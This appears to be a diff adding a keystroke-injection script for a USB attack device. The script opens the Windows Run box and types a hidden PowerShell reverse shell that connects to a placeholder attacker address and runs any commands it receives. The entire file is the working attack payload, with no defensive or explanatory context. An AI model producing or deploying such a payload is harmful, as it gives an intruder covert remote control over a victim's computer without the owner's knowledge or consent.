@@ -1,0 +1,5 @@
+DELAY 300
+GUI r
+DELAY 100
+STRING powershell -nop -w hidden -c "$b='IP.Goes.here.lol';$p=portgoeshere;$c=[System.Net.Sockets.TCPClient]::new($b,$p);$s=$c.GetStream();$b=[byte[]]::new(4096);while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=[System.Text.Encoding]::UTF8.GetString($b,0,$i);$r=Invoke-Expression $d 2>&1 | Out-String;$sb=[System.Text.Encoding]::UTF8.GetBytes($r);$s.Write($sb,0,$sb.Length);$s.Flush()}"
+ENTER
